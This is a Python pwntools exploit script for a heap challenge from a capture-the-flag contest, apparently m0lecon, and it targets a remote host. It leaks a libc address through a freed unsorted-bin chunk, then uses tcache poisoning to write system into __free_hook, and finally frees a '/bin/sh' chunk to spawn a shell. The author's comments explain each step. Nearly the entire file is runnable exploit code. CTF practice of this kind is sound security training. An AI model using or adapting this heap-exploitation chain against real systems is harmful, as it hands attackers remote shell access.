#!/usr/bin/env python3
from pwn import *
import os

context.binary = elf = ELF('./whisper_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

def conn():
    if args.REMOTE:
        return remote('offsec.m0lecon.it', 13531)
    return process(elf.path)

p = conn()

def allocate(index, size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index: ', str(index).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ', data)
    print(p.recvline())

def free(index):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index: ', str(index).encode())

def edit(index, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'index: ', str(index).encode())
    p.sendafter(b'data: ', data)

def view(index):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'index: ', str(index).encode())
    return p.recvn(8)

print(int(0x500))
# create a note at index 0 with size 0x500
allocate(0, int(0x500), b'A'*0x500)
# create a note at index 1 with size 0x500
allocate(1, int(0x500), b'B'*0x500)

# free the note at index 0
free(0)
# read note at index 0 to leak the libc address
leak = view(0)
libc_leak = u64(leak.ljust(8, b'\x00'))

log.info(f'Leaked libc address: {hex(libc_leak)}')

# we need to calculate the base address of libc. to do so, we need to find the offset of malloc_hook
'''leak = p.recvn(8)
fd_leak = u64(leak)

# Calculate base dynamically using the offset we just found
libc.address = fd_leak - LEAK_OFFSET  # Replace LEAK_OFFSET with the hex number you got above

print(f"[+] Libc Base: {hex(libc.address)}")
print(f"[+] __free_hook: {hex(libc.sym['__free_hook'])}")
print(f"[+] system: {hex(libc.sym['system'])}")

OFFSET = 0x1ecbe0
'''
# why 96 and 0x10"
# - when a chunk is in the unsorted bin, its forward pointer points to the head of the list inside the main_arena. however, it doesn't point 
#   at the very beginning of main_arena. it points to the structure bins, which start exactly 96 bytes after the beginning of main_arena.
# - inside the libc memory layout, the main_arena struct is compiled globally immediately following the __malloc_hook variable. it is 8 bytes long
#   and due to 8 byte alignment, the main_arena begins exactly 16 bytes after the start of __malloc_hook.

# we leaked the forward pointer, so we need to calculate the offset that we will use to obtain the base address of libc. 
#libc.address = libc_leak - OFFSET
# another thik to do is simply subtract the mallo_hook offset + ox70 (96 + 0x10) to the leak

malloc_hook_offset = libc.sym.__malloc_hook
# we know that main arena is at malloc_hook addr + 0x10, and bins[0] at main arena + 0x60\
main_arena_bin_offset = malloc_hook_offset + 0x70

libc.address = libc_leak - main_arena_bin_offset

print(f"[+] System address: {hex(libc.address)}")

free_hook = libc.sym['__free_hook']
system = libc.sym['system']

# tcache poisoning, as i've done in the previous ctf. 

allocate(3, int(0x60), b'C'*0x60)
allocate(4, int(0x60), b'D'*0x60)

free(3)
free(4)

# edit the forward pointer of the chunk at index 3 to point to __free_hoo
edit(4, p64(free_hook))

# allocate a dummy chunk
allocate(5, int(0x60), b'E'*0x60)
# allocate a chunk at __free_hook and write the address of system into it
allocate(6, int(0x60), p64(system))

'''
# view the chunk at index 
data_verification = u64(view(6))

print(f"[*] Address written to hook: {hex(data_verification)}")
print(f"[*] Expected system address: {hex(libc.sym['system'])}")
'''

# since __free_hook now points to system, when we free a chunk that contains the string "/bin/sh", it will call system("/bin/sh") and give 
# us a shell.

# create a chunk with the string "/bin/sh" and free it to trigger system("/bin/sh")
allocate(7, int(0x60), b'/bin/sh\x00')
free(7)

p.interactive()
